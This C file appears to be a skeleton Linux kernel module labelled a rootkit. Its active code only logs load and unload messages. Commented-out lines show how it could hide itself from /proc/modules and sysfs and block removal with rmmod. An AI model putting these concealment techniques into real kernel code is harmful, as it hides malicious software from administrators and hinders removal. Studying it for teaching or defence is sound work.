#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
MODULE_LICENSE("Dual BSD/GPL");

static int rootkit_init(void) {
 // remove ourself from /proc/modules
 //list_del_init(&__this_module.list);
 // remove ourself from /sys/modules
 //kobject_del(&THIS_MODULE->mkobj.kobj);
 // protect module from rmmod
 //try_module_get(THIS_MODULE)
 printk("rootkit loaded\n");
 return 0;
}

static void rootkit_exit(void) {
 printk("rootkit removed\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
